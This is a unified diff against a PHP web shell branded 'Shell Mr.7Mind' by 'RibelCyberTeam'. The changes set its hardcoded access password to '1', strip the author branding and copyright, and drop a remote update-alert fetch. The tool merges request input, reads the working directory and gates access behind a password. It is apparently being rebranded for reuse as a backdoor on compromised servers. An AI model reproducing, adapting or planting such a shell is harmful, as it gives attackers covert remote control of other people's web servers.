@@ -33,7 +33,7 @@ $Array = [
 	$_7 = array_merge($_POST, $_GET);
 	$_r = "required='required'";
 	$gcw = "getcwd";
-	$correctPassword = "heker"; //Change Password
+	$correctPassword = "1"; //Change Password
 	if (isset($_POST['pass'])) {
 		$enteredPassword = $_POST['pass'];
 		if ($enteredPassword === $correctPassword) {
@@ -53,14 +53,12 @@ $Array = [
 	<!DOCTYPE html>
 	<html>
 	<head>
-	<title>-=[ RibelCyberTeam ]=-</title>
 	<link rel='icon' href='https://raw.githubusercontent.com/Mr-7Mind/BahanShell/main/hehe.png'>
 	<meta name="theme color" content="#00BFFF">
 	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
 	</head>
 	<style>
     body {
-        background-image: url("https://i.pinimg.com/originals/7c/de/2e/7cde2ea6c641527af6ace384e42c89e6.gif");
         background-repeat: no-repeat;
         background-size: cover;
         background-position: center;
@@ -105,9 +103,6 @@ $Array = [
 	<?php
 	exit;
 	}
-	?>
-	<?php
-	echo file_get_contents("https://raw.githubusercontent.com/Mr-7Mind/AlertUpdate/main/190index.html"); // Alert for update
 	?>
 	<?php
 	if(isset($_7["left"])) {
@@ -276,9 +271,7 @@ $Array = [
 	echo "
 	<html>
 	<head>
-		<title>Shell Mr.7Mind</title>
 		<meta charset='UTF-8'>
-		<meta name='author' content='RibelCyberTeam'>
 		<meta name='viewport' content='width=device-width, initial-scale=0.70'>
 		<link rel='icon' href='https://chat.openai.com/apple-touch-icon.png'>
 		<link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css'>
@@ -1723,7 +1716,7 @@ Allow from all
 		?>
 		</tbody>
 		</table>
-		</div><div class='text-secondary'>&copy Mr.7Mind - RibelCyberTeam</div>
+		</div><div class='text-secondary'>&copy Mr.x</div>
 	</div>
 </div>
 </body>
